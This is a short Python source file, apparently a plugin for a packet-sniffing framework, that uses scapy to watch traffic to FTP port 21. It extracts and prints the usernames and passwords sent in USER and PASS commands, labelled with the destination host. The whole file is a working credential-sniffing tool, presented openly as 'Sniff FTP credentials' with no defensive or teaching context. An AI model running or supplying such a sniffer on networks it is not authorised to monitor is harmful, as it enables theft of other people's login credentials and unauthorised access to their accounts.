#!/usr/bin/python
# -*- coding: utf-8 -*-

from scapy.all import *

class module:

    def processPacket(self, packet):
        if packet.payload.dport == 21:
            data = packet.payload.payload.payload.fields["load"]
            if data.startswith("USER "):
                print "[+] FTP user for %s : %s" % (packet.payload.dst, data.replace("USER ", "").rstrip())
            if data.startswith("PASS "):
                print "[+] FTP pass for %s : %s" % (packet.payload.dst, data.replace("PASS ", "").rstrip())

    def getDescription(self):
        return "%s (%s)" % (self.moduleName, self.moduleDescription) 

    def __init__(self):
        self.moduleName = "ftpCredentials"
        self.moduleDescription = "Sniff FTP credentials"
